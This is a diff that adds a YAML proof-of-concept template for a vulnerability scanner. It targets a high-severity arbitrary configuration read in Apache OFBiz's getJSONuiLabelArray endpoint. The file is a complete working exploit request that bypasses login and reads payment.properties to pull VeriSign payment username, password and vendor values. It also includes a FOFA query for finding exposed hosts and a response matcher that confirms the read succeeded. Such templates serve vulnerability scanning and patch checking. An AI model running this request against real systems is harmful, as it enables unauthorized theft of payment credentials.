@@ -1,0 +1,18 @@
+id: poc-yaml-apache-ofbiz-getjsonuilabelarray-any-configuration-read
+info:
+  name: Apache OFBiz getJSONuiLabelArray 任意配置读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ofbiz
+  fofa: app="Apache_OFBiz"
+requests:
+- method: POST
+  path: /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y
+  headers:
+    Content-type: application/x-www-form-urlencoded
+  data: requiredLabels={"file:applications/accounting/config/payment.properties":["payment.verisign.user","payment.verisign.pwd","payment.verisign.vendor"]}
+  expression: status_code == 200 && contains(body,"\"[PayFlow UserID]\"") && contains(body,"\"[Vendor]\"")
+    && contains(content_type,"application/x-json")
+variables: {}
+transport: http
